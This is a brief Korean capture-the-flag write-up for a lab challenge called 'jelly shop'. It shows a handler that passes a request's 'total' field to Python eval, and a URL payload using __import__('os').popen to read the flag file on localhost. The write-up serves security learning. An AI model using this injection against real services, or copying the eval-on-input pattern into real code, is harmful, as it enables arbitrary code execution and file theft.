# 문제이름
jelly shop
# Usage
- 공란

# Concept
- command injection

# Writeup
```python
def order():
  json = request.get_json()
  result = eval(json['total'])
  if not result: return '주문과정 중 에러가 발생했습니다.'
  elif isinstance(result,int): return '주문이 완료되었습니다.'
  return result
```
코드를 보면 eval로 값을 더하는걸 볼수있다
eval은 파이썬코드를 그대로 실행시켜주기때문에 command injection취약점이 일어난다
먼저 아무 버튼이나 눌러서 파라미터를 보자
http://127.0.0.1:2007/?lemon_jelly=1&total=15
이런식으로 나온다 여기서 total부분이 eval함수에 취약하다
http://127.0.0.1:2007/?lemon_jelly=1&total=__import__(%27os%27).popen(%22cat%20plag/flag.txt%22).read()
total이라는 변수값에 
보이는거처럼
```python
__import__(%27os%27).popen(%22cat%20plag/flag.txt%22).read()
```
를 total뒤에다 입력해주고 엔터를 친다음 결제하기 버튼을 누르면
hspace{안녕하세요_flag입니다}
flag가 나온다